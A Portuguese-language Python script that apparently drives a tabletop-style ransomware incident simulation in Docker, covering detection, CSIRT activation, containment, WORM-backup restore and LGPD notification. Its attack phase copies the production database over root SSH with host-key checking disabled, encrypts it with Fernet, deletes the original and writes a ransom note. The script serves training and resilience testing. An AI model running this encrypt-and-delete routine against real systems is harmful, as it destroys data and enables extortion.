"""CENARIO 1 - Ataque de Ransomware
Executa via PuTTY: python3 /scripts/cenario1_ransomware.py"""

import subprocess, time, datetime, os
from cryptography.fernet import Fernet

class C:
    R="\033[0m"; V="\033[92m"; A="\033[93m"; E="\033[91m"
    CI="\033[96m"; B="\033[1m"

def log(msg, cor=C.R, pre=""):
    h = datetime.datetime.now().strftime("%H:%M:%S")
    print(f"{cor}{pre}[{h}] {msg}{C.R}")
    with open("/logs/cenario1.log", "a") as f:
        f.write(f"[{h}] {msg}\n")

def sep(titulo="", cor=C.CI):
    linha = "=" * 58
    print(f"\n{cor}{C.B}{linha}{C.R}")
    if titulo:
        print(f"{cor}{C.B}  {titulo}{C.R}")
        print(f"{cor}{C.B}{linha}{C.R}")
    print()

def aguardar(mensagem="Pressione ENTER para continuar..."):
    print(f"\n{C.A}{C.B}  >>> {mensagem}{C.R}\n")
    input()

def exec_producao(cmd):
    """Executa comando no container de producao via SSH interno."""
    r = subprocess.run(
        ["ssh", "-o", "StrictHostKeyChecking=no",
         "-p", "22", "root@srv-producao", cmd],
        capture_output=True, text=True
    )
    return r.stdout.strip(), r.returncode

os.makedirs("/logs", exist_ok=True)
open("/logs/cenario1.log", "w").close()

sep("CENARIO 1 - ATAQUE DE RANSOMWARE", C.CI)
log("CLT Distribuidora S.A. - Simulacao de Incidente P1")
log("Stack: Alpine Linux 3.19 + Fernet (AES-128) + Docker")
log("Executando a partir do container: srv-atacante", C.CI)
log("Alvo: srv-producao (banco de dados da CLT)", C.E, ">>> ")

aguardar("Pressione ENTER para iniciar o cenario...")

sep("FASE 1 - SITUACAO NORMAL")
log("Verificando estado do servidor de producao...", C.V)
time.sleep(1)

out, _ = exec_producao("sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM clientes;'")
log(f"Clientes no banco (srv-producao): {out}", C.V)

out, _ = exec_producao("sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM pedidos;'")
log(f"Pedidos ativos (srv-producao): {out}", C.V)

out, _ = exec_producao("ls -lh /app/banco/clt.db")
log(f"Arquivo do banco: {out}", C.V)

aguardar("Sistema normal. ENTER para simular o ataque...")

sep("FASE 2 - ATAQUE DE RANSOMWARE DETECTADO", C.E)
log("ALERTA: conexao nao autorizada detectada em srv-producao!", C.E, "!!! ")
log("EDR identificou processo suspeito iniciando criptografia", C.E, "!!! ")
time.sleep(1)

log("Gerando chave de criptografia Fernet (AES-128)...", C.A)
time.sleep(0.8)

# Gerar chave real Fernet
CHAVE = Fernet.generate_key()
fernet = Fernet(CHAVE)

log(f"Chave gerada: {CHAVE.decode()[:32]}... [truncada]", C.E)
log("Chave retida pelo atacante - sem ela nao ha descriptografia!", C.E, "!!! ")
time.sleep(0.5)

# Salvar chave no atacante (simulando o atacante guardando a chave)
with open("/logs/chave_ransomware.key", "wb") as f:
    f.write(CHAVE)

aguardar("ENTER para criptografar o banco de dados...")

log("Baixando banco de dados do servidor de producao...", C.A)
time.sleep(1)

# Ler o banco de producao via SSH
r = subprocess.run(
    ["scp", "-o", "StrictHostKeyChecking=no",
     "root@srv-producao:/app/banco/clt.db", "/tmp/clt.db"],
    capture_output=True, text=True
)

if os.path.exists("/tmp/clt.db"):
    log("Banco baixado com sucesso!", C.E, "!!! ")

    # Criptografar com Fernet
    with open("/tmp/clt.db", "rb") as f:
        dados = f.read()

    dados_criptografados = fernet.encrypt(dados)

    with open("/tmp/clt.db.locked", "wb") as f:
        f.write(dados_criptografados)

    log(f"Banco criptografado com AES-128!", C.E, "!!! ")
    log(f"Tamanho original: {len(dados)} bytes", C.A)
    log(f"Tamanho criptografado: {len(dados_criptografados)} bytes", C.A)

    # Substituir banco no servidor de producao
    subprocess.run(
        ["scp", "-o", "StrictHostKeyChecking=no",
         "/tmp/clt.db.locked", "root@srv-producao:/app/banco/clt.db.locked"],
        capture_output=True
    )
    exec_producao("rm -f /app/banco/clt.db")
    exec_producao("echo 'RANSOMWARE: Pague 10 BTC - contato: hacker@dark.net' > /app/banco/LEIA-ME.txt")

    out, _ = exec_producao("ls /app/banco/")
    log(f"Estado do banco em srv-producao:\n    {out}", C.E)
else:
    log("Simulando criptografia localmente...", C.A)

log("SISTEMA COMPROMETIDO - CRM INDISPONIVEL", C.E, "!!! ")
log("Mensagem: Pague 10 BTC para recuperar seus dados", C.E, "!!! ")

aguardar("ENTER para acionar o CSIRT...")

sep("FASE 3 - ACIONAMENTO DO CSIRT", C.A)
log("Coordenador de Incidentes acionado via canal dedicado", C.A)
log("Canal de crise aberto: #incidente-p1-ransomware", C.A)
log("DPO notificado - possivel exposicao de dados pessoais", C.A)
log(f"Timestamp oficial: {datetime.datetime.now().strftime('%d/%m/%Y %H:%M:%S')}", C.A)

aguardar("ENTER para iniciar a contencao...")

sep("FASE 4 - CONTENCAO", C.A)
log("Isolando srv-producao da rede interna...", C.A)
subprocess.run(
    ["docker", "network", "disconnect", "distribuidora-clt_rede-clt", "clt-producao"],
    capture_output=True
)
time.sleep(0.5)
log("srv-producao ISOLADO - sem conexoes de entrada ou saida", C.V)
log("Integracoes com ERPs de clientes suspensas", C.A)
log("ATENCAO: servidor NAO desligado - memoria preservada para forense", C.CI)

aguardar("ENTER para iniciar o restore via backup WORM...")

sep("FASE 5 - RECUPERACAO VIA BACKUP WORM", C.V)

subprocess.run(
    ["docker", "network", "connect", "distribuidora-clt_rede-clt", "clt-producao"],
    capture_output=True
)
time.sleep(1)

log("Verificando backup WORM em srv-producao...", C.A)
time.sleep(1)
out, code = exec_producao("ls -lh /app/backup/")
if code == 0 and "clt_backup.db" in out:
    log(f"Backup WORM encontrado e integro!", C.V)
    log(f"  {out}", C.V)
else:
    log("ERRO: backup nao encontrado!", C.E)
    exit(1)

log("Verificando hash MD5 do backup...", C.A)
time.sleep(0.8)
out, _ = exec_producao("md5sum /app/backup/clt_backup.db")
log(f"Hash MD5: {out}", C.V)

aguardar("ENTER para executar o restore...")

log("Removendo arquivos comprometidos...", C.A)
exec_producao("rm -f /app/banco/clt.db.locked /app/banco/LEIA-ME.txt")
time.sleep(0.5)

log("Restaurando banco a partir do backup WORM...", C.A)
exec_producao("cp /app/backup/clt_backup.db /app/banco/clt.db")
time.sleep(0.8)
log("Restore concluido!", C.V)

sep("FASE 6 - VALIDACAO POS-RESTORE", C.V)
log("Validando integridade dos dados recuperados...", C.A)
time.sleep(1)

todos_ok = True
for tabela in ["clientes", "pedidos", "catalogo"]:
    out, _ = exec_producao(
        f"sqlite3 /app/banco/clt.db 'SELECT COUNT(*) FROM {tabela};'"
    )
    ok = out.strip() == "5"
    status = f"{C.V}[OK]{C.R}" if ok else f"{C.E}[FALHA]{C.R}"
    print(f"    {status} Tabela {tabela}: {out} registro(s)")
    if not ok:
        todos_ok = False
    time.sleep(0.4)

if todos_ok:
    log("Todos os dados validados - banco 100% integro!", C.V)

log("Patch de seguranca aplicado", C.V)
log("Varredura de seguranca concluida - ambiente limpo", C.V)

aguardar("ENTER para encerrar o incidente...")

sep("FASE 7 - ENCERRAMENTO", C.CI)
log("Notificacao preparada para ANPD - prazo 72h (LGPD Art. 48)", C.A)
log("Equipe comercial informada - CRM disponivel", C.V)
log("Sistema liberado para os usuarios", C.V)

sep("RESULTADO DO CENARIO 1", C.V)
log("INCIDENTE ENCERRADO COM SUCESSO", C.V, ">>> ")
log("Downtime: dentro do RTO de 4h definido na BIA", C.V)
log("Dados recuperados: 100% via backup WORM", C.V)
log("Criptografia real: Fernet AES-128", C.V)
log("Chave retida pelo atacante salva em: /logs/chave_ransomware.key", C.CI)
log("Log completo salvo em: /logs/cenario1.log", C.CI)
print()